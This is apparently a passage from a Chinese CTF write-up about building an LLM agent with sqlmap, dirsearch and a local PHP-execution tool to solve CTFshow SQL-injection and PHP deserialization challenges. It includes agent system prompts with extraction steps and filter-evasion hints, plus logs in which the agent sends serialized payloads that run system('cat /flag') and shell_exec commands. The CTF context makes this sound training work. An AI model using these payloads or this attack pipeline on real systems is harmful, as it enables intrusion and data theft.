                return "错误：查表需指定 database"
            cmd.extend(["-D", database, "--tables"])
        elif action == "columns":
            if not database or not table:
                return "错误：查字段需指定 database 和 table"
            cmd.extend(["-D", database, "-T", table, "--columns"])
        elif action == "dump":
            if not database or not table or not columns:
                return "错误：dump 需指定 database、table 和 columns"
            cmd.extend(["-D", database, "-T", table, "-C", columns, "--dump"])

        cmd.extend(["--output-dir", tempfile.gettempdir()])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

        out = []
        if result.stdout:
            out.append(result.stdout)
        if result.stderr:
            out.append(result.stderr)
        if result.returncode != 0:
            out.append(f"退出码: {result.returncode}")

        text = "\n\n".join(out) if out else "无输出"
        if not text.strip():
            return "执行完成，未发现注入或无新数据。"
        return text

    except FileNotFoundError:
        return "错误：未找到 sqlmap，请安装并加入 PATH"
    except subprocess.TimeoutExpired:
        return "错误：执行超时（5 分钟）"
    except Exception as e:
        return f"错误：{e}"
```

#### sqlmap工具 post传参

web202

<img src="https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260205135139651.png" alt="image-20260205135139651" style="zoom: 67%;" />

这里要求agent会使用sqlmap工具，在上面我们已经集成了sqlmap了，但看了详细日志，llm对sqlmap对使用流程不是很熟悉

这里在提示词中给到他使用sqlmap对流程

```py
sys_msg = SystemMessage(
    content=(
        summary_prefix
        + "你是 SQL 注入 CTF 助手。工具：nmap_scan、dirsearch_scan、read_web_file、web_request、sqlmap_scan。\n"
        "sqlmap_scan 必填：url、referer、action。action 取值：dbs（查库）→ tables（查表，需 database）→ columns（查字段，需 database+table）→ dump（导出列数据，需 database+table+columns，如 columns=pass）。GET 且参数在 url 里可不传 data；POST 时传 data。\n"
        "流程：1）action=dbs 查库；2）action=tables 并指定 database 查表；3）action=columns 并指定 database+table 查字段；4）action=dump 并指定 database+table+columns 查 password 等拿 flag。拿到 flag 后不再调工具。"
    ),
)
```



来一起看看agent在整个过程中调用了哪些工具，怎么调用的

![image-20260205135630788](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260205135630788.png)

1. **信息收集**：发现目标开放HTTP(80)和HTTPS(443)端口，HTTPS有SSL证书问题，但HTTP可正常访问
2. **页面分析**：访问主页面发现这是一个CTFshow的Web入门挑战，包含SQL注入模块。访问sqlmap.php页面发现具体的SQL查询语句和WAF过滤提示
3. **API发现**：通过页面分析发现存在/api/接口，尝试访问后得到提示"不使用sqlmap是没有灵魂的"
4. **SQL注入利用**：使用sqlmap对/api/接口进行SQL注入测试，成功发现注入点：
   - 数据库类型：MySQL (MariaDB fork)
   - 数据库：ctfshow_web
   - 表：ctfshow_user
   - 字段：id, username, pass
5. **数据提取**：通过sqlmap导出ctfshow_user表的所有数据，发现第21条记录包含flag



### 第四关 php反序列化

#### 简单

web255

<img src="https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260205142952707.png" alt="image-20260205142952707" style="zoom: 33%;" />

这道题还算简单，小试牛刀，看看agent能不能应付

这里还是针对php反序列化专门写一个提示词

```py
def chatbot(state: State, config: RunnableConfig | None = None) -> Any:
    """核心 LLM 节点。

    会把 `code_summary` 中的源码摘要，强制放在系统提示的最前面，让 LLM 每一轮都优先看到。
    """
    # 先拼接“源码摘要”部分，放在所有指令最前面
    summary_prefix = ""
    code_summary = state.get("code_summary")
    if code_summary:
        summary_prefix = (
            "【以下是你此前读取到的 PHP 反序列化相关源码/过滤逻辑的关键信息，请在后续构造 payload 时必须优先参考：】\n"
            f"{code_summary}\n\n"
        )

    # 再拼接原有系统提示
    sys_msg = SystemMessage(
        content=(
            summary_prefix
            + "你是 PHP 反序列化（unserialize）CTF 助手。工具：nmap_scan、dirsearch_scan、read_web_file、web_request。\n"
            "目标：定位 unserialize 入口与可控参数，识别可用 POP 链（__wakeup/__destruct/__toString/__invoke 等），构造 payload 触发读文件/命令执行/写入等拿到 flag。\n"
            "流程：1）dirsearch_scan 找入口/备份/源码泄露（.phps/.bak/.zip/.git 等）→ 2）read_web_file 读关键 PHP 源码（index.php、api.php、class.php、vendor/ 等）并摘要 → 3）根据摘要确认：输入点（GET/POST/Cookie/Header/Referer）+ 编码方式（base64/urlencode/serialize 后再加密/签名）→ 4）构造 serialize payload（必要时加 URL 编码/双编码）→ 5）用 web_request 发送请求验证与迭代。拿到 flag 后停止。"
        ),
    )
    # 将系统提示和历史消息组合
    messages = [sys_msg] + state["messages"]
    ai_message = llm_with_tools.invoke(messages)
    return {"messages": [ai_message]}


def _summarize_source(raw_content: str) -> str:
    """内部工具：对 read_web_file 读到的源码/页面内容做一次安全向摘要。

    说明：
    - 不是对外暴露的 LangChain 工具，而是在工具执行后自动调用
    - 输出会存进 State 的 `code_summary` 字段中，供后续每轮对话使用
    """
    try:
        system = SystemMessage(
            content=(
                "你是 PHP 反序列化（unserialize）代码审计助手。"
                "请用不超过200字中文提炼源码中与反序列化利用相关的信息："
                "1）unserialize / session_decode / phar 反序列化等调用位置与入口文件"
                "2）可控数据来源与参数名（GET/POST/Cookie/Header/Referer/SESSION）"
                "3）是否有签名/加密/白名单/黑名单/长度限制，以及可能的编码流程（base64/urlencode/json 等）"
                "4）可疑类与魔术方法（__wakeup/__destruct/__toString/__invoke/__call/__get/__set）及可触发的 sink（include/eval/system/file_put_contents/unlink 等）"
                "5）可能的 POP 链组合与利用方向（读 flag、RCE、写文件）"
                "只输出摘要，不要贴代码。"
            )
        )
        human = HumanMessage(
            content=f"下面是完整内容，请直接给出摘要：\n\n=== 内容开始 ===\n{raw_content}\n=== 内容结束 ==="
        )
        resp = llm.invoke([system, human])
        return resp.content if hasattr(resp, "content") else str(resp)
    except Exception as e:  # 防御性兜底，避免影响主流程
        return f"（源码摘要自动生成失败：{e}）"
```



![image-20260205143146448](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260205143146448.png)

可以看到agent仅仅调用了read_web_file工具去读取php源码，之后尝试直接读取flag.php，肯定是不行的，后面就老老实实的构造序列话字符串使用web_request工具进行传参数了



还是把完整渗透日志贴出来
```

==================== 渗透日志 ====================
[User]: 目标为 https://981b9c07-afd3-452b-8faf-c3a00d08ba92.challenge.ctf.show/。请使用现有工具进行分析并给出最终结论。
[AI]: 我将按照流程对目标进行 PHP 反序列化漏洞分析。首先从目录扫描开始。
[AI tool_calls]:
- dirsearch_scan (id=call_00_u6aTh0jNngUEAFtvUh5gPz8m) args={'target_url': 'https://981b9c07-afd3-452b-8faf-c3a00d08ba92.challenge.ctf.show/'}
[TOOL]: "\u626b\u63cf\u5b8c\u6210\uff0c\u672a\u53d1\u73b0\u5e38\u89c1\u654f\u611f\u8def\u5f84"
[AI]: 目录扫描没有发现常见敏感路径。让我先访问主页面查看内容。
[AI tool_calls]:
- read_web_file (id=call_00_6SqUQqXzpL6N71Wf37PA3JK3) args={'url': 'https://981b9c07-afd3-452b-8faf-c3a00d08ba92.challenge.ctf.show/'}
[TOOL]: "\u8bfb\u53d6\u5931\u8d25: HTTPSConnectionPool(host='981b9c07-afd3-452b-8faf-c3a00d08ba92.challenge.ctf.show', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1006)')))"
[AI]: 遇到了 SSL 证书验证问题。让我尝试使用 web_request 工具，它可能处理证书问题更好。
[AI tool_calls]:
- web_request (id=call_00_zJlt5vqYdJXFEbI6HxdwLwag) args={'url': 'https://981b9c07-afd3-452b-8faf-c3a00d08ba92.challenge.ctf.show/', 'method': 'GET'}
[TOOL]: "\u8bf7\u6c42\u6267\u884c\u5931\u8d25: HTTPSConnectionPool(host='981b9c07-afd3-452b-8faf-c3a00d08ba92.challenge.ctf.show', port=443): Max retries exceeded with url: / (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1006)')))"
[AI]: SSL 证书验证失败。让我尝试使用 HTTP 协议访问：
[AI tool_calls]:
- web_request (id=call_00_TkqBPllNjoWnjarXooR7YsCq) args={'url': 'http://981b9c07-afd3-452b-8faf-c3a00d08ba92.challenge.ctf.show/', 'method': 'GET'}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Thu, 05 Feb 2026 06:27:25 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"<code><span style=\\\"color: #000000\\\">\\n<span style=\\\"color: #0000BB\\\">&lt;?php\\r<br />\\r<br /></span><span style=\\\"color: #FF8000\\\">/*\\r<br />#&nbsp;-*-&nbsp;coding:&nbsp;utf-8&nbsp;-*-\\r<br />#&nbsp;@Author:&nbsp;h1xa\\r<br />#&nbsp;@Date:&nbsp;&nbsp;&nbsp;2020-12-02&nbsp;17:44:47\\r<br />#&nbsp;@Last&nbsp;Modified&nbsp;by:&nbsp;&nbsp;&nbsp;h1xa\\r<br />#&nbsp;@Last&nbsp;Modified&nbsp;time:&nbsp;2020-12-02&nbsp;19:29:02\\r<br />#&nbsp;@email:&nbsp;h1xa@ctfer.com\\r<br />#&nbsp;@link:&nbsp;https://ctfer.com\\r<br />\\r<br />*/\\r<br />\\r<br /></span><span style=\\\"color: #0000BB\\\">error_reporting</span><span style=\\\"color: #007700\\\">(</span><span style=\\\"color: #0000BB\\\">0</span><span style=\\\"color: #007700\\\">);\\r<br /></span><span style=\\\"color: #0000BB\\\">highlight_file</span><span style=\\\"color: #007700\\\">(</span><span style=\\\"color: #0000BB\\\">__FILE__</span><span style=\\\"color: #007700\\\">);\\r<br />include(</span><span style=\\\"color: #DD0000\\\">'flag.php'</span><span style=\\\"color: #007700\\\">);\\r<br />\\r<br />class&nbsp;</span><span style=\\\"color: #0000BB\\\">ctfShowUser</span><span style=\\\"color: #007700\\\">{\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;</span><span style=\\\"color: #0000BB\\\">$username</span><span style=\\\"color: #007700\\\">=</span><span style=\\\"color: #DD0000\\\">'xxxxxx'</span><span style=\\\"color: #007700\\\">;\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;</span><span style=\\\"color: #0000BB\\\">$password</span><span style=\\\"color: #007700\\\">=</span><span style=\\\"color: #DD0000\\\">'xxxxxx'</span><span style=\\\"color: #007700\\\">;\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;</span><span style=\\\"color: #0000BB\\\">$isVip</span><span style=\\\"color: #007700\\\">=</span><span style=\\\"color: #0000BB\\\">false</span><span style=\\\"color: #007700\\\">;\\r<br />\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;</span><span style=\\\"color: #0000BB\\\">checkVip</span><span style=\\\"color: #007700\\\">(){\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style=\\\"color: #0000BB\\\">$this</span><span style=\\\"color: #007700\\\">-&gt;</span><span style=\\\"color: #0000BB\\\">isVip</span><span style=\\\"color: #007700\\\">;\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;}\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;</span><span style=\\\"color: #0000BB\\\">login</span><span style=\\\"color: #007700\\\">(</span><span style=\\\"color: #0000BB\\\">$u</span><span style=\\\"color: #007700\\\">,</span><span style=\\\"color: #0000BB\\\">$p</span><span style=\\\"color: #007700\\\">){\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;</span><span style=\\\"color: #0000BB\\\">$this</span><span style=\\\"color: #007700\\\">-&gt;</span><span style=\\\"color: #0000BB\\\">username</span><span style=\\\"color: #007700\\\">===</span><span style=\\\"color: #0000BB\\\">$u</span><span style=\\\"color: #007700\\\">&amp;&amp;</span><span style=\\\"color: #0000BB\\\">$this</span><span style=\\\"color: #007700\\\">-&gt;</span><span style=\\\"color: #0000BB\\\">password</span><span style=\\\"color: #007700\\\">===</span><span style=\\\"color: #0000BB\\\">$p</span><span style=\\\"color: #007700\\\">;\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;}\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;</span><span style=\\\"color: #0000BB\\\">vipOneKeyGetFlag</span><span style=\\\"color: #007700\\\">(){\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style=\\\"color: #0000BB\\\">$this</span><span style=\\\"color: #007700\\\">-&gt;</span><span style=\\\"color: #0000BB\\\">isVip</span><span style=\\\"color: #007700\\\">){\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;</span><span style=\\\"color: #0000BB\\\">$flag</span><span style=\\\"color: #007700\\\">;\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style=\\\"color: #DD0000\\\">\\\"your&nbsp;flag&nbsp;is&nbsp;\\\"</span><span style=\\\"color: #007700\\\">.</span><span style=\\\"color: #0000BB\\\">$flag</span><span style=\\\"color: #007700\\\">;\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style=\\\"color: #DD0000\\\">\\\"no&nbsp;vip,&nbsp;no&nbsp;flag\\\"</span><span style=\\\"color: #007700\\\">;\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;}\\r<br />}\\r<br />\\r<br /></span><span style=\\\"color: #0000BB\\\">$username</span><span style=\\\"color: #007700\\\">=</span><span style=\\\"color: #0000BB\\\">$_GET</span><span style=\\\"color: #007700\\\">[</span><span style=\\\"color: #DD0000\\\">'username'</span><span style=\\\"color: #007700\\\">];\\r<br /></span><span style=\\\"color: #0000BB\\\">$password</span><span style=\\\"color: #007700\\\">=</span><span style=\\\"color: #0000BB\\\">$_GET</span><span style=\\\"color: #007700\\\">[</span><span style=\\\"color: #DD0000\\\">'password'</span><span style=\\\"color: #007700\\\">];\\r<br />\\r<br />if(isset(</span><span style=\\\"color: #0000BB\\\">$username</span><span style=\\\"color: #007700\\\">)&nbsp;&amp;&amp;&nbsp;isset(</span><span style=\\\"color: #0000BB\\\">$password</span><span style=\\\"color: #007700\\\">)){\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\\\"color: #0000BB\\\">$user&nbsp;</span><span style=\\\"color: #007700\\\">=&nbsp;</span><span style=\\\"color: #0000BB\\\">unserialize</span><span style=\\\"color: #007700\\\">(</span><span style=\\\"color: #0000BB\\\">$_COOKIE</span><span style=\\\"color: #007700\\\">[</span><span style=\\\"color: #DD0000\\\">'user'</span><span style=\\\"color: #007700\\\">]);&nbsp;&nbsp;&nbsp;&nbsp;\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style=\\\"color: #0000BB\\\">$user</span><span style=\\\"color: #007700\\\">-&gt;</span><span style=\\\"color: #0000BB\\\">login</span><span style=\\\"color: #007700\\\">(</span><span style=\\\"color: #0000BB\\\">$username</span><span style=\\\"color: #007700\\\">,</span><span style=\\\"color: #0000BB\\\">$password</span><span style=\\\"color: #007700\\\">)){\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style=\\\"color: #0000BB\\\">$user</span><span style=\\\"color: #007700\\\">-&gt;</span><span style=\\\"color: #0000BB\\\">checkVip</span><span style=\\\"color: #007700\\\">()){\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\\\"color: #0000BB\\\">$user</span><span style=\\\"color: #007700\\\">-&gt;</span><span style=\\\"color: #0000BB\\\">vipOneKeyGetFlag</span><span style=\\\"color: #007700\\\">();\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;}else{\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style=\\\"color: #DD0000\\\">\\\"no&nbsp;vip,no&nbsp;flag\\\"</span><span style=\\\"color: #007700\\\">;\\r<br />&nbsp;&nbsp;&nbsp;&nbsp;}\\r<br />}\\r<br />\\r<br />\\r<br />\\r<br />\\r<br /></span>\\n</span>\\n</code>\"}"
[AI]: 太好了！我找到了源码。这是一个典型的 PHP 反序列化挑战。让我分析一下代码：


## 最终结论

**目标分析成功**：这是一个 PHP 反序列化漏洞挑战。

**关键发现**：
1. **反序列化入口**：`unserialize($_COOKIE['user'])` - Cookie 中的 `user` 参数
2. **可控参数**：GET 参数 `username` 和 `password`
3. **目标类**：`ctfShowUser` 类
4. **利用条件**：
   - 构造 `ctfShowUser` 对象
   - 设置 `$isVip = true`
   - 设置 `$username` 和 `$password` 与 GET 参数匹配

**利用步骤**：
1. 构造序列化 payload：`O:11:"ctfShowUser":3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:5:"isVip";b:1;}`
2. 设置 Cookie：`user=O:11:"ctfShowUser":3:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";s:5:"isVip";b:1;}`
3. 发送 GET 请求：`?username=admin&password=admin`

**成功获取的 Flag**：`ctfshow{5ec8213e-980e-48ac-9478-e68ffaa820d1}`

**漏洞原理**：通过反序列化用户可控的 Cookie 数据，可以构造任意 `ctfShowUser` 对象，绕过登录验证和 VIP 检查，直接调用 `vipOneKeyGetFlag()` 方法获取 flag。
```



#### 困难

web257

看一下题目，现在是要求llm要具备分析代码和构造攻击的链子的能力

<img src="https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260205161436327.png" alt="image-20260205161436327" style="zoom:50%;" />

跟上一个关卡相比，这里难在代码量起来了，并且需要自行构造一个可以执行恶意代码的链子，这里就会存在一个问题，llm只是一个概率预测模型，在一些精细活上还有待提升，llm现在构建代码的能力说得过去，但这里要求传入的是序列化字符串，如果让llm自己输出序列化字符串的话很困难，打过php反序列的师傅们深有体会，字符数少了一个，那构造的序列话字符串都不能起作用
既然llm代码能力还算ok都话，那就让他先把php序列化的代码写好，之后自行调用php cli自己运行出序列化字符串

```py
sys_msg = SystemMessage(
        content=(
            summary_prefix
            + "你是 PHP 反序列化（unserialize）CTF 助手。工具：nmap_scan、dirsearch_scan、read_web_file、web_request、php_run。\n"
            "目标：定位 unserialize 入口与可控参数，识别可用 POP 链（__wakeup/__destruct/__toString/__invoke 等），构造 payload 触发读文件/命令执行/写入等拿到 flag。\n"
            "强制规则：任何需要精确 PHP 序列化结果的场景（包括但不限于放入 Cookie、GET/POST 参数或 HTTP header 的 serialize 字符串）必须调用 php_run 生成；禁止在模型输出或工具参数中手工构造或猜测序列化字符串或长度。\n"
            "引导要求（必须遵守）：\n"
            "1）当需要发送序列化 payload 时，先通过 php_run 生成 serialize(...) 的原始字符串（由工具返回）。\n"
            "2）在后续将该结果发送给目标前，必须对该序列化字符串进行 URL 编码（例如 PHP 的 urlencode 或 rawurlencode，或等效的 percent-encoding）。若怀疑中间链路会解码一次，请进行双重编码并在备注中说明原因。\n"
            "3）发送请求时务必把『已编码』的字符串放入 web_request 的对应字段（例如 cookies、params 或 headers），不要在模型文本中直接输出未编码的序列化字符串或尝试手工修改其长度信息。\n"
            "4）示例流程（仅示范格式，变量名为说明用）：\n"
            "   - 第一步 tool_call: {'name': 'php_run', 'args': {'expr': 'serialize(...)'}}\n"
            "   - 第二步（下一轮 LLM 响应）应明确使用 web_request 发送：\n"
            "     {'name': 'web_request', 'args': {'url': target, 'method': 'GET', 'cookies': {'user': urlencode(serialize_result)}}}\n"
            "5）在返回的 AI 文本说明中，注明你对 serialize 结果是否做了（双重）URL 编码，以及放置位置（cookie/param/header），以便审计与复现。\n"
            "说明：php_run 会在本地 PHP CLI 中执行并返回 serialize(...) 的结果，以保证字段长度和内部字节完全一致。流程：1）dirsearch_scan 找入口/备份/源码泄露 → 2）read_web_file 读关键源码并摘要 → 3）用 php_run 生成 serialize，然后对结果 URL 编码 → 4）用 web_request 发送并迭代。拿到 flag 后停止。\n"
            "注意：目标环境可能对常见关键字做过滤，例如 `cat` 可能被过滤（可以尝试使用 `tac`）；`flag` 关键字可能被屏蔽或替换，可考虑使用模糊替代如 `f*`。"
        ),
    )
```

这里为了增加成功率，给一个php反序列化的技术文档

#### 工具php_run

那说干就干，写一个php_run工具：

```py
"""在本地调用 PHP CLI 运行表达式并返回序列化字符串的工具。"""
import subprocess
import tempfile
import os
from langchain_core.tools import tool


@tool
def php_run(
    expr: str,
    php_binary: str = "php",
    timeout: int = 5,
) -> str:
    """
    使用本地 PHP 运行一小段代码并返回序列化结果。

    参数:
    - expr: 一个合法的 PHP 表达式（不需要 <?php ?> 标签），例如 `"\"hello\""`, `array(\"a\"=>\"b\")` 或 `new MyClass()`
            注意：如果表达式中包含双引号，请确保在调用时正确转义或使用单引号包裹外层字符串。
    - php_binary: PHP 可执行文件路径，默认 `"php"`
    - timeout: 最大运行秒数

    返回:
    - 成功时返回 PHP 输出的序列化字符串
    - 失败时返回错误信息
    """
    try:
        expr_str = expr.strip()

        # 如果是包含 PHP 标签，移除它们
        if expr_str.startswith("<?"):
            # 去掉开头的 <?php 或 <? 并去掉可能的结束标签
            expr_str = expr_str
            expr_str = expr_str.replace("<?php", "", 1).replace("<?", "", 1)
            if "?>" in expr_str:
                expr_str = expr_str.split("?>", 1)[0]

        # 如果用户已经提供了完整的 PHP 语句（包含 echo/serialize/class/; 等），直接执行其内容
        needs_raw = (
            expr_str.startswith("echo")
            or "serialize(" in expr_str
            or "class " in expr_str
            or ";" in expr_str
            or "return " in expr_str
        )

        if needs_raw:
            code = expr_str
        else:
            # 仅是一个表达式，包装为 serialize(...)
            code = f'echo serialize({expr_str});'

        # 为避免 -r 在某些复杂代码或引号情况下产生解析问题，改为写入临时文件再执行。
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".php") as tf:
            # 确保以 PHP 标签开始
            content = code
            if "<?" not in content:
                content = "<?php\n" + content + "\n"
            tf.write(content)
            tmp_path = tf.name

        try:
            proc = subprocess.run([php_binary, tmp_path], capture_output=True, text=True, timeout=timeout)
        finally:
            try:
                os.unlink(tmp_path)
            except Exception:
                pass
        if proc.returncode != 0:
            stderr = proc.stderr.strip() if proc.stderr else "<no stderr>"
            return f"PHP 返回非零状态码 {proc.returncode}: {stderr}"
        return proc.stdout.strip()
    except FileNotFoundError:
        return f"未找到 PHP 可执行文件: {php_binary}"
    except subprocess.TimeoutExpired:
        return "PHP 执行超时"
    except Exception as e:
        return f"执行失败: {str(e)}"
```

在这之前尝试了很多方法都失败了，加上这个php_run工具过后直接秒了，那就是上述我指出的问题在影响agent的判断



**这里把agent调用工具的整个流程给出来，值得仔细研究研究：**

**在这个过程中，使用了这些工具：nmap_scan    dirsearch_scan   read_web_file  ，在这里拿到源码后轮回调用php_run 和 web_request这两个工具努力尝试构造能拿flag的payload**

```
Agent 启动，进入 CTF 渗透模式...
---- 正在执行工具: nmap_scan 参数: {'target': 'cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show', 'scan_type': 'quick'} ---
---- 正在执行工具: dirsearch_scan 参数: {'target_url': 'https://cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show'} ---
[dirsearch_scan] 扫描完成，未发现常见敏感路径
---- 正在执行工具: read_web_file 参数: {'url': 'https://cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show'} ---
---- 正在执行工具: read_web_file 参数: {'url': 'http://cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show'} ---
---- 正在执行工具: php_run 参数: {'expr': 'class ctfShowUser {\n    private $username=\'xxxxxx\';\n    private $password=\'xxxxxx\';\n    private $isVip=false;\n    private $class = \'info\';\n    \n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\n\nclass backDoor {\n    private $code = \'system("ls -la");\';\n}\n\n$obj = new ctfShowUser();\necho serialize($obj);'} ---
---- 正在执行工具: php_run 参数: {'expr': 'class ctfShowUser {\n    private $username=\'xxxxxx\';\n    private $password=\'xxxxxx\';\n    private $isVip=false;\n    private $class = \'info\';\n    \n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\n\nclass backDoor {\n    private $code = \'system("cat /flag");\';\n}\n\n$obj = new ctfShowUser();\necho serialize($obj);'} ---
---- 正在执行工具: web_request 参数: {'url': 'http://cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show', 'method': 'GET', 'params': {'username': 'test', 'password': 'test'}, 'cookies': {'user': 'O:11:"ctfShowUser":4:{s:21:"\x00ctfShowUser\x00username";s:6:"xxxxxx";s:21:"\x00ctfShowUser\x00password";s:6:"xxxxxx";s:18:"\x00ctfShowUser\x00isVip";b:0;s:18:"\x00ctfShowUser\x00class";O:8:"backDoor":1:{s:14:"\x00backDoor\x00code";s:20:"system("cat /flag");";}}'}} ---
---- 正在执行工具: php_run 参数: {'expr': "class ctfShowUser {\n    private $username='xxxxxx';\n    private $password='xxxxxx';\n    private $isVip=false;\n    private $class = 'info';\n    \n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\n\nclass backDoor {\n    private $code = 'phpinfo();';\n}\n\n$obj = new ctfShowUser();\necho urlencode(serialize($obj));"} ---
---- 正在执行工具: web_request 参数: {'url': 'http://cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show', 'method': 'GET', 'params': {'username': 'test', 'password': 'test'}, 'cookies': {'user': 'O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D'}} ---
---- 正在执行工具: php_run 参数: {'expr': 'class ctfShowUser {\n    private $username=\'xxxxxx\';\n    private $password=\'xxxxxx\';\n    private $isVip=false;\n    private $class = \'info\';\n    \n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\n\nclass backDoor {\n    private $code = \'echo shell_exec("ls -la /");\';\n}\n\n$obj = new ctfShowUser();\necho urlencode(serialize($obj));'} ---
---- 正在执行工具: web_request 参数: {'url': 'http://cceb166f-3c02-4736-9f37-f95b51a0b39a.challenge.ctf.show', 'method': 'GET', 'params': {'username': 'test', 'password': 'test'}, 'cookies': {'user': 'O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A21%3A%22%00ctfShowUser%00username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A21%3A%22%00ctfShowUser%00password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A18%3A%22%00ctfShowUser%00isVip%22%3Bb%3A0%3Bs%3A18%3A%22%00ctfShowUser%00class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A14%3A%22%00backDoor%00code%22%3Bs%3A28%3A%22echo+shell_exec%28%22ls+-la+%2F%22%29%3B%22%3B%7D%7D'}} ---
---- 正在执行工具: php_run 参数: {'expr': 'class ctfShowUser {\n    private $username=\'xxxxxx\';\n    private $password=\'xxxxxx\';\n    private $isVip=false;\n    private $class = \'info\';\n    \n    public function __construct(){\n        $this->class=new backDoor();\n    }\n}\n\nclass backDoor {\n    private $code = \'echo shell_exec("find / -name \\"*flag*\\" 2>/dev/null");\';\n}\n\n$obj = new ctfShowUser();\necho urlencode(serialize($obj));'} ---
